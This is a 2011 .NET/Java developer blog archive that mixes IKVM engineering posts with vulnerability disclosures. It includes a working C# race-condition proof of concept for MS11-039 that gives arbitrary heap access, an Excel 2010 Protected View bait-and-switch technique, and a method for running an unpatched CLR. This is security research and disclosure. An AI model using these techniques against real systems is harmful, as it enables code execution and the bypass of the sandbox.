		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=897f3cb2-9c9b-40c9-a9d7-c72a1a6d44a7">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 11 July 2011</h2></div>
<div class="newsItems"><a name="ab73c4889-9ab4-4dfe-a203-e3767a8c2d08"></a><div class="entry">
	<h3 class="entryTitle">How to Detect if a Method is Overridden Redux</h3>
	<div class="entryBody">
		<P>Using a clever hack is always risky. <A href="/PermaLink.aspx?guid=5967637c-d1ed-4b10-9442-212e17f5da17">Previously</A> I described how to use the <CODE>ldftn</CODE> and <CODE>ldvirtftn</CODE> CIL instructions to detect if a method is overriden by a subclass. It turns out that there is a problem with this trick. If the method containing the <CODE>ldftn</CODE> instruction is JITted before the method it refers to, the method pointer returned (and burned into the generated code)&nbsp;is the JIT stub, when the method subsequently is JITted the new function pointer is stored in the vtable of subsequently loaded subclasses and the detection method yields a false positive.</P>
<P>Here's a small C# demo that demonstrates an equivalent effect:</P>
<P><CODE><SPAN style="COLOR: blue">using</SPAN> System;<BR><SPAN style="COLOR: blue">using</SPAN> System.Runtime.CompilerServices;<BR><BR><SPAN style="COLOR: blue">class</SPAN> <SPAN style="COLOR: #2b91af">Program</SPAN> {<BR>&nbsp; <SPAN style="COLOR: blue">static void</SPAN> Main() {<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: #2b91af">RuntimeMethodHandle</SPAN> m = <SPAN style="COLOR: blue">typeof</SPAN>(<SPAN style="COLOR: #2b91af">Program</SPAN>).GetMethod("Foo").MethodHandle;<BR>&nbsp;&nbsp;&nbsp; <FONT color=#008000>//RuntimeHelpers.PrepareMethod(m);</FONT><BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: #2b91af">Console</SPAN>.WriteLine(m.GetFunctionPointer());<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">new</SPAN> <SPAN style="COLOR: #2b91af">Program</SPAN>().Foo();<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: #2b91af">Console</SPAN>.WriteLine(m.GetFunctionPointer());<BR>&nbsp; }<BR><BR>&nbsp; <SPAN style="COLOR: blue">public virtual void</SPAN> Foo() { }<BR>}</CODE></P>
<P>When you run this program on .NET, it prints out two different values. One possible solution is present in the commented out line, if you uncomment that the two pointer values printed will be the same, because <CODE><A href="http://msdn.microsoft.com/en-us/library/0bt50792.aspx">PrepareMethod</A></CODE> forces the method to be JIT compiled.</P>
<P>Another slightly more robust method is to avoid <CODE>ldftn</CODE> and use <CODE>ldvirtftn</CODE> to get the base method as well. The downside is that you need to have an instance of an object of a class that does not override the method in question.</P>
<P>Finally, if you want to use this approach consider using this as an optimization and if this detection is positive, use reflection to confirm.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/11/2011 16:35:52 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b73c4889-9ab4-4dfe-a203-e3767a8c2d08"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b73c4889-9ab4-4dfe-a203-e3767a8c2d08">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 28 June 2011</h2></div>
<div class="newsItems"><a name="ade964df2-d54f-455b-8ec6-5288bbb4b532"></a><div class="entry">
	<h3 class="entryTitle">java.lang.AutoCloseable</h3>
	<div class="entryBody">
		<P>Java 7 introduces <A href="http://blogs.oracle.com/darcy/entry/project_coin_try_out_try">try-with-resources</A>. This is similar<SUP>1</SUP> to the C# <CODE><A href="http://msdn.microsoft.com/en-us/library/yh598w02.aspx">using</A></CODE> construct. Yesterday I committed the changes necessary for IKVM to have bi-directional interop between these two. Previously, every<SUP>2</SUP> Java class that implemented <CODE><A href="http://download.oracle.com/javase/6/docs/api/java/io/Closeable.html">java.io.Closeable</A></CODE> already automatically got an <CODE><A href="http://msdn.microsoft.com/en-us/library/system.idisposable.aspx">System.IDisposable</A></CODE> for free from ikvmc, but now the new <CODE><A href="http://download.java.net/jdk7/docs/api/java/lang/AutoCloseable.html">java.lang.AutoCloseable</A></CODE> interface <EM>shadows</EM> IDisposible (similar to how <CODE>java.lang.Comparable</CODE> <EM>shadows</EM> <CODE>System.IComparable</CODE>).</P>
<P>The fact that <CODE>AutoCloseable</CODE> shadows <CODE>IDisposable</CODE> means that it extends <CODE>IDisposable</CODE> (this is not visible from Java) and that all Java code that works with <CODE>AutoCloseable</CODE> will accept <CODE>IDisposable</CODE> references.</P>
<P>Unfortunately this is technically a breaking change. If you have a .NET class that implements <CODE>java.io.Closeable</CODE>, it now also must implement <CODE>IDisposable</CODE>, but since that makes sense, it's likely it already does.</P>
<P>Since <CODE>java.io.Closeable</CODE> now extends <CODE>java.lang.AutoCloseable</CODE>, the special casing of <CODE>java.io.Closeable</CODE> has been removed from ikvmc.</P>
<P>Here's an example of using the new Java 7 try-with-resources feature on a .NET type:</P>
<P><CODE>import cli.System.IO.*;<BR><BR>public class&nbsp;TryWithResources {<BR>&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp; try (FileStream fs = File.OpenWrite("foo.txt")) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fs.Write("Foo".getBytes(), 0, 3);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>}</CODE></P>
<HR>

<P><SUP>1</SUP> There is one important difference in that try-with-resources supports something called suppressed exceptions.<BR><SUP>2</SUP> Not every class. If you already implement IDisposable explicitly, you don't get an extra one. </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/28/2011 07:44:14 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=de964df2-d54f-455b-8ec6-5288bbb4b532"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=de964df2-d54f-455b-8ec6-5288bbb4b532">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 23 June 2011</h2></div>
<div class="newsItems"><a name="a2b341f75-480c-4154-adc8-ce5571da35c3"></a><div class="entry">
	<h3 class="entryTitle">[deleted]</h3>
	<div class="entryBody">
		<P>Entry temporarily deleted.</P>
<P>Update: Reposted <A HREF="/PermaLink.aspx?guid=23cced47-ccdb-460d-acc9-ce16154ab6a5">here</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/23/2011 14:29:04 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2b341f75-480c-4154-adc8-ce5571da35c3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2b341f75-480c-4154-adc8-ce5571da35c3">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 22 June 2011</h2></div>
<div class="newsItems"><a name="ad2db3fc7-46e0-40ff-92b8-65702f155c32"></a><div class="entry">
	<h3 class="entryTitle">Excel 2010 Bait-and-Switch Sandbox Escape</h3>
	<div class="entryBody">
		<P>Office 2010 introduced a sandboxing technology for untrusted documents called <A href="http://blogs.technet.com/b/office2010/archive/2009/08/13/protected-view-in-office-2010.aspx">Protected View</A>. When a document is opened from an untrusted location (e.g. the Internet) it is first opened in a sandboxed process to limit the impact of document parsing bugs or other things of that nature. Only after the user has confirmed that the document is what they expect (and want to "edit" it) they click on <STRONG>Enable Editing</STRONG> to open the document outside of the sandbox in a fully functioning Office application.</P>
<P>Excel 2010 has a flaw that under certain conditions causes it to redownload the document when the user clicks on Enable Editing. This allows a malicious website to initially provide a safe document and subsequently after the user decides to trust the document to provide a different malicious document.</P>
<P><a href="http://www.frijters.net/excel/">Here's an example.</a></P>
<P>After you click on the button, IE will show a dialog asking if you want to Open or Save. Click Open. Now the harmless.xlsx document opens. Next click on Enable Editing. Excel will now crash because it attempts to load a malformed document (note that this is just a null pointer dereference and is very unlikely to be exploitable).</P>
<P>For effect I chose to provide a crashing document, but you can also replace the .xlsx with an .xlsm (a document with macros) and Excel will happily load it (to enable macros the user will have to explicitly click on Enable Content).</P>
<P>This demo is confirmed to work on Windows 7 with IE 9 and Excel 2010. All fully patched.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/22/2011 08:25:10 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d2db3fc7-46e0-40ff-92b8-65702f155c32"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d2db3fc7-46e0-40ff-92b8-65702f155c32">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 21 June 2011</h2></div>
<div class="newsItems"><a name="a7a068c08-8ee2-4658-8890-1029abea9dff"></a><div class="entry">
	<h3 class="entryTitle">How to Run Unpatched CLR Side-by-Side</h3>
	<div class="entryBody">
		<p>If you want to investigate a CLR security patch, you can of course setup a VM 
where you don&#39;t install the patch or you can simply not install the patch until 
after the investigation is done. I&#39;ve done both in the past, but when I was
<a HREF="/CommentView.aspx?guid=c1e9440e-becc-41a4-bf2a-12c407f07737">
reverse engineering MS10-060</a> I decide to try something different.</p>
<p>One of the advantages (and disadvantages) of the .NET Framework over Java or Mono 
is that it &quot;integrates&quot; with the OS. This means that you can&#39;t simply install 
two different versions of .NET 2.0 (for example) on your machine, but you can 
install .NET 1.1, .NET 2.0 and .NET 4.0 side-by-side. So I assumed that it 
should also be possible to have multiple versions of .NET 2.0 &quot;installed&quot; on 
your system. To test this I created a Hello World app with the following app.config:</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;<br />
&lt;configuration&gt;<br />
&nbsp;&nbsp;&nbsp; &lt;startup&gt;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;supportedRuntime version=&quot;v2.0.66666&quot;/&gt;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;requiredRuntime version=&quot;v2.0.66666&quot;/&gt;<br />
&nbsp;&nbsp;&nbsp; &lt;/startup&gt;<br />
&lt;/configuration&gt;</code></p>
<p>Then I fired up
<a href="http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx">Process 
Monitor</a> and started looking at what happened if I tried to run the Hello 
World app.</p>
<p>It turns out that this is enough to make mscoree.dll look for the CLR in 
the %windir%\Microsoft.NET\Framework\v2.0.66666 directory for the runtime 
version to use. When that fails it gives you a message box asking if you want to 
install the .NET Framework v2.0.66666.</p>
<p>The obvious next step is to xcopy /s the contents of the v2.0.50727 directory into 
the v2.0.66666 directory. Now the Hello World app runs using mscorwks.dll and 
mscorjit.dll from the v2.0.66666 directory, so the contents of the v2.0.66666 
can be replaced with the unpatched versions.</p>
<p>For the MS11-039 patch, I also wanted the unpatched System.dll and at this point it 
was still being loaded from the GAC. Back to Process Monitor which showed that the 
CLR was looking for a file named <strong>fusion.localgac</strong> in the v2.0.66666 
directory, so that looked promising. After creating this file (content doesn&#39;t 
matter), I started getting assembly load failures and after copying the 
unpatched framework assemblies into the application directory the app ran 
successfully.</p>
<p>Now I could comfortably develop and test the PoC on my main system, without being 
vulnerable (if someone knew that I have this unpatched version 
installed, they could try to attack me specifically, but that would fail as I&#39;ve disabled running .NET code in the browser because
<a HREF="/PermaLink.aspx?guid=7c6beb13-701d-48da-8030-929b353f0fbe">Microsoft takes too long to patch publicly known vulnerabilities</a>).</p>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/21/2011 09:48:07 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7a068c08-8ee2-4658-8890-1029abea9dff"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7a068c08-8ee2-4658-8890-1029abea9dff">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 16 June 2011</h2></div>
<div class="newsItems"><a name="a4eb904a7-e81d-4340-8258-f23835441242"></a><div class="entry">
	<h3 class="entryTitle">MS11-039 Vulnerability Details</h3>
	<div class="entryBody">
		<P>Tuesday Microsoft released two .NET security bulletins, one of which <A href="http://www.microsoft.com/technet/security/bulletin/ms11-039.mspx">MS11-039</A> I will discuss here.</P>
<P>The patch updated System.dll and diffing the updated assembly with the previous version shows that they've added additional parameter validation to the Socket <A href="http://msdn.microsoft.com/en-us/library/ms145161.aspx">Send</A> and <A href="http://msdn.microsoft.com/en-us/library/ms145155.aspx">Receive</A> APIs that take <CODE>IList&lt;<A href="http://msdn.microsoft.com/en-us/library/1hsbd92d.aspx">ArraySegment</A><BYTE>&gt;</CODE> parameters.</P>
<P>The fix consists of validating the Offset and Count properties of the passed in ArraySegment values. If you read the ArraySegment <A href="http://msdn.microsoft.com/en-us/library/9cc4bx8k.aspx">constructor</A> documentation, you see that it throws an ArgumentException if the offset or count are not in range, but given that ArraySegment is a value type, it is easy to break this "invariant" by taking advantage of the <A href="http://blogs.msdn.com/b/ericlippert/archive/2011/05/31/atomicity-volatility-and-immutability-are-different-part-two.aspx">non-atomicity of value assignment</A>.</P>
<P>Here's an example the exploits the bug to create a magical array that allows negative indexing (and arbitrary heap access, trivially adaptable to an exploit to run arbitrary code):</P><CODE><SPAN style="COLOR: blue">using</SPAN> System;<BR><SPAN style="COLOR: blue">using</SPAN> System.Collections.Generic;<BR><SPAN style="COLOR: blue">using</SPAN> System.Net.Sockets;<BR><SPAN style="COLOR: blue">using</SPAN> System.Net;<BR><SPAN style="COLOR: blue">using</SPAN> System.Threading;<BR><SPAN style="COLOR: blue"><BR>class</SPAN> Program<BR>{<BR><SPAN style="COLOR: blue">&nbsp; static</SPAN> <SPAN style="COLOR: blue">byte</SPAN>[] buf1;<BR>&nbsp; <SPAN style="COLOR: blue">static</SPAN> <SPAN style="COLOR: blue">byte</SPAN>[] buf2;<BR>&nbsp; <SPAN style="COLOR: blue">static</SPAN> ArraySegment&lt;<SPAN style="COLOR: blue">byte</SPAN>&gt; seg;<BR><BR>&nbsp; <SPAN style="COLOR: blue">static</SPAN> <SPAN style="COLOR: blue">void</SPAN> Main(<SPAN style="COLOR: blue">string</SPAN>[] args)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; Socket server = <SPAN style="COLOR: blue">new</SPAN> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);<BR>&nbsp;&nbsp;&nbsp; server.Bind(<SPAN style="COLOR: blue">new</SPAN> IPEndPoint(IPAddress.Loopback, 0));<BR>&nbsp;&nbsp; &nbsp;server.Listen(1);<BR>&nbsp;&nbsp;&nbsp; Socket client = <SPAN style="COLOR: blue">new</SPAN> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);<BR>&nbsp;&nbsp;&nbsp; client.Connect(server.LocalEndPoint);<BR>&nbsp;&nbsp;&nbsp; Socket conn = server.Accept();<BR>&nbsp;&nbsp;&nbsp; List&lt;ArraySegment&lt;<SPAN style="COLOR: blue">byte</SPAN>&gt;&gt; buffers = <SPAN style="COLOR: blue">new</SPAN> List&lt;ArraySegment&lt;<SPAN style="COLOR: blue">byte</SPAN>&gt;&gt;();<BR>&nbsp;&nbsp;&nbsp; buffers.Add(seg);<BR><BR>&nbsp;&nbsp;&nbsp; buf1 = <SPAN style="COLOR: blue">new</SPAN> <SPAN style="COLOR: blue">byte</SPAN>[0];<BR>&nbsp;&nbsp;&nbsp; buf2 = <SPAN style="COLOR: blue">new</SPAN> <SPAN style="COLOR: blue">byte</SPAN>[1000];<BR><BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">for</SPAN> (<SPAN style="COLOR: blue">int</SPAN> i = 0; i &lt; buf2.Length; i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buf2[i] = 0xFF;<BR><BR>&nbsp;&nbsp;&nbsp; Thread mutator = <SPAN style="COLOR: blue">new</SPAN> Thread(Mutator);<BR>&nbsp;&nbsp;&nbsp; mutator.Start();<BR><BR>&nbsp;&nbsp;&nbsp; Thread.Sleep(100);<BR><BR>&nbsp;&nbsp;&nbsp; ArraySegment&lt;<SPAN style="COLOR: blue">byte</SPAN>&gt; grab;<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">for</SPAN> (; ; )<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; grab = seg;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">if</SPAN> (grab.Array.Length == 0 &amp;&amp; grab.Count != 0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(<SPAN class=str>"got it!"</SPAN>);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mutator.Abort();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">break</SPAN>;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(grab.Array.Length);<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(grab.Count);<BR><BR>&nbsp;&nbsp;&nbsp; client.Send(buf2);<BR>&nbsp;&nbsp;&nbsp; SocketError errorCode;<BR>&nbsp;&nbsp;&nbsp; buffers[0] = grab;<BR>&nbsp;&nbsp;&nbsp; conn.Receive(buffers, SocketFlags.None, <SPAN style="COLOR: blue">out</SPAN> errorCode);<BR><BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(buf2.Length);<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(buf2[-100]);<BR>&nbsp; }<BR><BR>&nbsp; <SPAN style="COLOR: blue">static</SPAN> <SPAN style="COLOR: blue">void</SPAN> Mutator()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">for</SPAN> (; ; )<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; seg = <SPAN style="COLOR: blue">new</SPAN> ArraySegment&lt;<SPAN style="COLOR: blue">byte</SPAN>&gt;(buf1, 0, 0);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; seg = <SPAN style="COLOR: blue">new</SPAN> ArraySegment&lt;<SPAN style="COLOR: blue">byte</SPAN>&gt;(buf2, 0, 1000);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>} </CODE>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/16/2011 10:35:25 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4eb904a7-e81d-4340-8258-f23835441242"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4eb904a7-e81d-4340-8258-f23835441242">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 10 June 2011</h2></div>
<div class="newsItems"><a name="a5cf7770d-6aea-40fe-9ecc-7c1390fddc9d"></a><div class="entry">
	<h3 class="entryTitle">Calendar</h3>
	<div class="entryBody">
		<P>I'll be at the following conferences this summer:</P>
<UL>
<LI>July 18-20: <A href="http://openjdk.java.net/projects/mlvm/jvmlangsummit/">JVM Language Summit</A></LI>
<LI>July 23-25: <A href="http://monospace.us/">Monospace 2011</A></LI>
<LI>September 13-16: <A href="http://www.buildwindows.com/">BUILD</A></LI></UL>
<P>Send me an <A href="mailto:jeroen@frijters.net">e-mail</A> if you want to meet up for a chat.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/10/2011 07:13:15 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5cf7770d-6aea-40fe-9ecc-7c1390fddc9d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5cf7770d-6aea-40fe-9ecc-7c1390fddc9d">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 18 May 2011</h2></div>
<div class="newsItems"><a name="ac1c354e6-2c7d-404a-b2fe-244db9f03250"></a><div class="entry">
	<h3 class="entryTitle">Implementation Dependencies</h3>
	<div class="entryBody">
		<P><STRONG>Field Ordering</STRONG></P>
<P>A new feature in today's snapshot is that <A href="http://download.oracle.com/javase/6/docs/api/java/lang/Class.html#getDeclaredFields()">java.lang.Class.getDeclaredFields()</A> now returns the fields in class declaration order for ikvmc compiled code (dynamically compiled code always did this).</P>
<P>This is not required by the specification, but recently after debugging a complex piece of code that failed when compiled with ikvmc because of a field ordering dependency I did some more thinking and came up with a way to cheaply retain the field ordering.</P>
<P><STRONG>IKVM.Reflection</STRONG></P>
<P>Like Java reflection, System.Reflection makes no promises about ordering, so how do you retain the ordering without adding additional bookkeeping overhead? The key lies in IKVM.Reflection, since ikvmc now uses IKVM.Reflection to emit the metadata I know how to make sure that fields are emitted in a particular order and that this gives them increasing <A href="http://msdn.microsoft.com/en-us/library/system.reflection.memberinfo.metadatatoken.aspx">metadata tokens</A>.</P>
<P>So all I had to do is make a minor modification to ikvmc to define the fields in the same order as they are defined in the class file and in the runtime reflection code sort the <A href="http://msdn.microsoft.com/en-us/library/system.reflection.fieldinfo.aspx">FieldInfo</A> array returned by <A href="http://msdn.microsoft.com/en-us/library/ch9714z3.aspx">Type.GetFields()</A> by metadata token.</P>
<P><STRONG>Annotations by Proxy</STRONG></P>
<P>The JDK implements annotations by using <A href="http://download.oracle.com/javase/6/docs/api/java/lang/reflect/Proxy.html">java.lang.reflect.Proxy</A> to implement the annotation interface. This is an implementation decision and not promised by the spec anywhere, but predictably there is also code that (for no good reason) assumes that annotations are always implemented by java.lang.reflect.Proxy.</P>
<P>This code <A href="http://sourceforge.net/tracker/?func=detail&amp;aid=3254823&amp;group_id=69637&amp;atid=525264">failed</A> on ikvmc compiled code, because there I generated .NET custom attributes that implement the annotation interface and simply returned the custom attribute object.</P>
<P>So I've changed the annotation reflection code to now return a java.lang.reflect.Proxy as well (for compatibility, the custom attribute annotations still implement the annotation interface).</P>
<P><STRONG>Conclusion</STRONG></P>
<P>You can write whatever you want in the specification, but when an ecosystem is dominated by one implementation, people are going to write against the implementation, not the specification.</P>
<P>This is not just annoying for alternative implementations, but the dominant implementation also suffers, because in subsequent versions you have far less freedom in evolving your implementation.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/18/2011 08:23:51 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c1c354e6-2c7d-404a-b2fe-244db9f03250"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c1c354e6-2c7d-404a-b2fe-244db9f03250">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a97e7895c-3b18-4f26-8743-bdda777b70e4"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Since it has been a while, time for a new development snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Expose annotations on statically compiled code as java.lang.reflect.Proxy instead of the custom attribute object, to deal with broken code that assumes annotations are always implemented with Proxy. Fix for #3254823. 
<LI>Added delegate conversion for java.lang.reflect.InvocationHandler to ikvm.runtime.Delegates. 
<LI>Changed build to specify "-cp dummy" for javac compile to avoid accidentally picking up classes on the CLASSPATH. 
<LI>Added experimental (i.e. not yet finished) -proxy: option to ikvmc to pre-generate proxy class. 
<LI>Added method prologue support to remap file. 
<LI>Updated AtomicInteger, AtomicIntegerArray, AtomicLonger, AtomicLongerArray to use .NET 2.0 interlocked operations. 
<LI>Added stind_i8 opcode to remap file. 
<LI>Changed build and JNI code to use different names for the Windows x86 and x64 versions of the native dll. 
<LI>Added missing lib/*.properties files (in particular lib/calendars.properties which caused java.util.JapaneseImperialCalendar to fail). 
<LI>Retain reflection field ordering for ikvmc compiled code (not required by spec, but to improve compatibility with broken code). 
<LI>AWT: Fixed a StringIndexOutOfBoundsException if RTL and LTR text are used in one string. 
<LI>AWT: Added emulation for fixed metrics to make drawString and stringWidth compatible. 
<LI>AWT: Added workaround for bug in OpenJDK 6 on Windows. The result is that the needed width for painting of labels and buttons can be 1 pixel larger as the prefered size. The result was labels with "...". 
<LI>IKVM.Reflection: Fixed TypeBuilder.DefineNestedType() to accept a null reference for the interfaces parameter.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.47.4154.zip">ikvmbin-0.47.4154.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/18/2011 07:57:20 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=97e7895c-3b18-4f26-8743-bdda777b70e4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=97e7895c-3b18-4f26-8743-bdda777b70e4">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 19 April 2011</h2></div>
<div class="newsItems"><a name="a19f8fefc-d782-48ef-8c6c-f4a2aef471e4"></a><div class="entry">
	<h3 class="entryTitle">MS11-028 Vulnerability Details</h3>
	<div class="entryBody">
		<P>The bug report apparently originated on <A href="http://stackoverflow.com/questions/3407616/generic-list-of-value-types-with-sequential-layout-and-pack-size-bug">stackoverflow</A> and was subsequently filed on Microsoft <A href="https://connect.microsoft.com/VisualStudio/feedback/details/583519/generic-list-of-value-types-with-sequential-layout-and-pack-size-x86-jit-engine-bug">connect</A>. So it has been public since August 4, 2010 and easily findable in connect (that's how I found it, by searching for JIT bugs). Microsoft seems to believe that since they have not seen any widespread exploits of .NET vulnerabilities (see claim <A href="http://blogs.technet.com/b/srd/archive/2011/04/12/assessing-the-risk-of-the-april-security-updates.aspx">here</A>) that this was not a high priority issue.</P>
<P>I've drawn my conclusions and disabled running all .NET code in the browser on my system.</P>
<P>It should also be noted that using ClickOnce, this issue can be used to execute code outside of the Internet Explorer Protected Mode sandbox.</P>
<P>Here is a simple example that uses the bug to violate type safety:</P>
